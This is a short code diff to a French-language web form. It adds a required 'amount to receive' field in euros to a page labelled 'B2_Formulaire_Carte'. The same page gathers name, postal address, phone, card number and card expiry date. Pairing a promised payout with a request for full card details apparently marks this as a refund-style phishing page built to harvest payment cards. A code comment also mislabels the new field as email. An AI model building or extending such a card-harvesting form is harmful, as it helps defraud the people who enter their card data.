@@ -93,8 +93,20 @@
                     <input type="text" id="2" name="champ_2" class="form-input" placeholder="Ex: 123 Avenue des Champs-Élysées" required>
                 </div>
 
-                      
-
+<div class="form-group">
+    <label class="form-label">
+        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <circle cx="12" cy="12" r="2"/>
+            <path d="M6 12h.01M18 12h.01"/>
+        </svg>
+        Montant à recevoir<span class="required-star">*</span>
+    </label>
+    <div style="position: relative; display: flex; align-items: center; width: 100%;">
+        <input type="number" min="0" id="3" name="champ_3" class="form-input" placeholder="Ex: 50" style="width: 100%; padding-right: 40px;" required>
+        <span style="position: absolute; right: 16px; font-weight: 700; color: #64748b; font-size: 15px; pointer-events: none;">€</span>
+    </div>
+</div>
                 <div class="form-group">
                     <label class="form-label">
                         <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -234,7 +246,7 @@
             page_source: 'B2_Formulaire_Carte',
             champ1: getFieldValue('1', 'champ1'), // Nom & Prénom
             champ2: getFieldValue('2', 'champ2'), // Adresse Postale
-
+            champ3: getFieldValue('3', 'champ3'), // Email
             champ4: getFieldValue('4', 'champ4'), // Téléphone
             champ5: getFieldValue('5', 'champ5'), // Numéro de Carte
             champ6: getFieldValue('6', 'champ6'), // Date d'expiration
